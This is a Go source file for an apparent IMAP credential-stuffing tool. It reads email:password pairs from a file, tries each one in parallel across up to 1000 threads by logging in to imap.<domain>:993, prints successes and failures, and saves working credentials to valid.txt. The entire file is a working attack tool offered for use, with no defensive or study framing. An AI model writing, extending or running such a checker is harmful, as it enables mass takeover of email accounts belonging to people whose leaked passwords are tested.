package main

import (
	"bytes"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"log"
	"net"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/emersion/go-imap/client"
)

type Account struct {
	Domain   string
	Username string
	Password string
}

var (
	inpfile = flag.String("i", "emails.txt", "Input file mail:pass")
	outfile = flag.String("o", "valid.txt", "Output file")
	threads = flag.Int("t", 1000, "Number of threads")
	ops     uint64
	wg      sync.WaitGroup
	mutex   = &sync.Mutex{}
)

// TODO: connection timeouts
func main() {
	flag.Parse()
	jobs := make(chan *Account, 100000)
	emails := ReadFile(*inpfile)
	start := time.Now()

	for w := 1; w <= *threads; w++ {
		wg.Add(1)
		go Worker(jobs)
	}

	wg.Add(1)
	go GrabCredentials(jobs, emails)

	wg.Wait()
	fmt.Printf("OPS: %d, Time elapsed: %.2f sec.\n", atomic.LoadUint64(&ops), time.Since(start).Seconds())
}

func SaveData(path string, a *Account) error {
	f, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModeAppend)
	if err != nil {
		return err
	}
	defer f.Close()

	acc := a.Username + "@" + a.Domain + ":" + a.Password

	_, err = f.WriteString(acc)
	if err != nil {
		return err
	}
	return nil
}

func ReadFile(filepath string) (emails []string) {
	file, err := ioutil.ReadFile(filepath)
	if err != nil {
		log.Fatal(err)
	}

	buf := bytes.NewBuffer(file)
	for {
		email, err := buf.ReadString('\n')
		if len(email) == 0 {
			if err != nil {
				if err == io.EOF {
					break
				}
				return
			}
		}

		emails = append(emails, email)
		if err != nil && err == io.EOF {
			return
		}
	}
	return
}

func GrabCredentials(jobs chan<- *Account, raw_data []string) {
	for _, line := range raw_data {
		usr_pw := strings.Split(strings.TrimRight(line, "\n"), ":")
		login_domain := strings.Split(usr_pw[0], "@")

		jobs <- &Account{
			Username: login_domain[0],
			Password: usr_pw[1],
			Domain:   strings.ToLower(login_domain[1]),
		}
	}

	close(jobs)
	defer wg.Done()
}

func Dialer() *net.Dialer {
	return &net.Dialer{Timeout: 5 * time.Second}
}

func Check(a *Account) {
	cli, err := client.DialWithDialerTLS(Dialer(), "imap."+a.Domain+":993", nil) // TODO: Add protocols and domains
	if err != nil {
		return
	}
	defer cli.Logout()

	if err := cli.Login(a.Username, a.Password); err != nil {
		fmt.Printf(">> Failed %s:%s\n", a.Username, a.Password)
		return
	}

	fmt.Printf("<< Success %s:%s\n", a.Username, a.Password)
	SaveData(*outfile, a)
	return
}

func Worker(jobs <-chan *Account) {
	for job := range jobs {
		Check(job)
		atomic.AddUint64(&ops, 1)
	}
	defer wg.Done()
}
